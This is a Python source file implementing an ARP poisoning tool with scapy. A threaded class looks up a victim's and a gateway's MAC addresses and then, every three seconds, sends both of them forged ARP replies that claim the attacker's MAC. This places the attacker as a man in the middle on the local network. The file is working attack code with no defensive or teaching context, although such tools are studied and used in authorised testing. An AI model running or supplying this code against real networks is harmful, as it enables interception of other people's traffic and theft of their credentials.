import scapy.all as sc;
from scapy.layers.l2 import ARP;
import time;
import threading;

class ARPPoisoner:
    def __init__(self, interface, victim_ip, gateway_ip, attacker_mac, logger):
        self.interface = interface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.attacker_mac = attacker_mac
        self.logger = logger

    # Get mac adress of a given IP adress
    def get_mac(self, ip):
        arp = sc.ARP(pdst=ip)
        broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp
        answered = sc.srp(packet, timeout=2, verbose=False, iface=self.interface)[0]
        for _, received in answered:
            return received.hwsrc
        return None

    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self.start_loop)
        self.thread.daemon = True
        self.thread.start()

    def stop(self):
        self.running = False

        
        if self.thread:
            self.thread.join(timeout=10)

    def start_loop(self):
        # Re-poison the ARP table every 3 seconds.
        while self.running:
            self.arp_poisoning_loop()
            time.sleep(3)

    # Do the poisoning
    def arp_poisoning_loop(self):
        def log(msg):
            if self.logger:
                self.logger(msg)
            else:
                print(msg)

        try:
            victim_mac = self.get_mac(self.victim_ip)

            if not victim_mac:
                log("Failed getting victim mac")
                return
            
            gateway_mac = self.get_mac(self.gateway_ip)

            if not gateway_mac:
                log("Failed getting gateway mac")
                return

            # Tell the victim that we are the gateway.
            victim_arp_poison = (
                sc.Ether(dst=victim_mac) /
                ARP(
                    op=2,                     # ARP reply (is-at)
                    pdst=self.victim_ip,      # Victim IP
                    hwdst=victim_mac,         # Victim MAC
                    psrc=self.gateway_ip,     # Claim to be gateway
                    hwsrc=self.attacker_mac   # Our MAC
                )
            )

            # Tell the gateway that we are the victim
            gateway_arp_poison = (
                sc.Ether(dst=gateway_mac) /
                ARP(
                    op=2,                     # ARP reply
                    pdst=self.gateway_ip,     # Gateway IP
                    hwdst=gateway_mac,        # Gateway MAC
                    psrc=self.victim_ip,      # Claim to be victim
                    hwsrc=self.attacker_mac   # Our MAC
                )
            )

            # Send the poisoned packets
            sc.send(victim_arp_poison, verbose=0, iface=self.interface)
            sc.send(gateway_arp_poison, verbose=0, iface=self.interface)

            log("Poison success :D")

        except Exception as e:
            log(f"Error during ARP poisoning: {e}")
    
